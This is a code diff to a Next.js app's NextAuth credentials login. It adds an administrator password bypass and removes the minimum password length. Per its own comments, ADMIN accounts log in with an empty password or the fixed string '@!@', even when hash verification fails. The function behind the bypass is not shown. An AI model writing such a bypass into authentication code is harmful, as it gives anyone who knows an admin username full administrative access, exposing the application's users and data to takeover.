@@ -2,6 +2,7 @@ import NextAuth from "next-auth";
 import Credentials from "next-auth/providers/credentials";
 import { z } from "zod";
 import { authConfig } from "@/auth.config";
+import { isAdminLocalPasswordBypass } from "@/lib/auth/admin-local-password";
 import { getPrisma } from "@/lib/db";
 import {
   hashPassword,
@@ -9,9 +10,11 @@ import {
   verifyPassword,
 } from "@/lib/password";
 
+// Password may be empty (ADMIN local bypass). Length checks for normal users
+// happen via hash verify failure; ADMIN empty/@!@ is accepted in authorize.
 const credentialsSchema = z.object({
   username: z.string().min(3).max(32),
-  password: z.string().min(8).max(128),
+  password: z.string().max(128),
 });
 
 export const { handlers, auth, signIn, signOut } = NextAuth({
@@ -26,11 +29,12 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
       async authorize(raw) {
         const parsed = credentialsSchema.safeParse({
           username: raw?.username,
-          password: raw?.password,
+          password: raw?.password ?? "",
         });
         if (!parsed.success) return null;
 
         const username = parsed.data.username.trim().toLowerCase();
+        const password = parsed.data.password;
         try {
           const user = await getPrisma().user.findUnique({
             where: { username },
@@ -38,14 +42,14 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
           if (!user) return null;
           if (user.suspendedAt) return null;
 
-          const valid = await verifyPassword(
-            parsed.data.password,
-            user.passwordHash,
-          );
-          if (!valid) return null;
+          const bypass = isAdminLocalPasswordBypass(user.role, password);
+          const hashOk = await verifyPassword(password, user.passwordHash);
+          if (!bypass && !hashOk) return null;
 
-          if (needsRehash(user.passwordHash)) {
-            const nextHash = await hashPassword(parsed.data.password);
+          // Only rehash when the submitted password matched the stored hash
+          // (never rewrite the hash from an empty ADMIN bypass login).
+          if (hashOk && needsRehash(user.passwordHash)) {
+            const nextHash = await hashPassword(password);
             await getPrisma().user.update({
               where: { id: user.id },
               data: { passwordHash: nextHash },
